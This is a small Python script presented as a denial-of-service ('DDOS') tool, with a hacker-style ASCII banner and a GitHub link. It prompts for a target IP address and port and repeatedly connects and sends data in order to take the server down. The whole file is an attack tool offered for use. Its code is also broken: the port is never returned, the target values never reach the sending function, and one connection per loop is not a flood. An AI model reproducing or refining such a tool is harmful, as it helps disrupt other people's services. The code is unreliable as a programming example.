#!/usr/bin/env python
import socket
import ipaddress
import subprocess
import platform as _platform
def act():
    while True:
        try:
            TCP_IP =input("\033[0;32;40mEnter Target IP Address: (ex: 127.0.0.1)\033[0m")
            TCP_PORT = int(input("\033[0;32;40mEnter Port: (ex: [80] [443] [21]\033[0m"))
            return ipaddress.ip_address(TCP_IP)
            return int(TCP_PORT)
        except ValueError as e:
                print("\033[2;31;40m Did you understand my question?")
                input("Press any to continue.\n")
                clear()
def clear():
    if _platform.system() == 'Linux':
         subprocess.call('clear',shell=True)
    elif _platform.system() == 'Windows':
        subprocess.call('cls',shell=True)
    elif _platform.system() =='Linux2':
        subprocess.call('clear',shell=True)
    else:
        subprocess.call("cls")


def dos():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    s.send(bytes(MESSAGE, encoding='utf8'))
    data = s.recv(BUFFER_SIZE)
    print("Please Wait until the server is down")

def credits():
    print("\033[2;32;40m          See The Good, For the Suffering, finding your hole! ")
    print("\033[1;33;40m                   -----------------------------")
    print("         C        /+++++++++++++++++++++++++++++\\       H")
    print("         Y       /+++++++++++++++++++++++++++++++\\      A")
    print("         B      |++++++++++++++++++++++++++++++++|      C")
    print("         E      |++++++++++++++++++++++++++++++++|      K")
    print("         R      |++++++++++++++++++++++++++++++++|      E")
    print("                |++++++++++++++++++++++++++++++++|      R")
    print("         W      |++++++++++++++++++++++++++++++++|       ")
    print("         O      |++++++++++++++++++++++++++++++++|      2")
    print("         R      |++++++++++++++++++++++++++++++++|      0")
    print("         L      |++++++++++++++++++++++++++++++++|      1")
    print("         D      \++++++++++++++++++++++++++++++++/      6")
    print("                 \++++++++++++++++++++++++++++++/")
    print("                  ------------------------------")
    print("        Github: https://github.com/whoami213/DDOS-CWH_DDOS-Simple- \n\n\n")

credits()
for i in range(1000):
    try:
        act()
        BUFFER_SIZE = 20
        MESSAGE = "Whoami"
        dos()
        print("\033[1;32;40mSending Packet Data ......")
    except ipaddress.AddressValueError as e:
        print("\033[2;31;40m Did you understand my question?")
        input("Press any to continue.")
        clear()

    except socket.error as e:
        print("\033[1;31;40m Server is down,", e)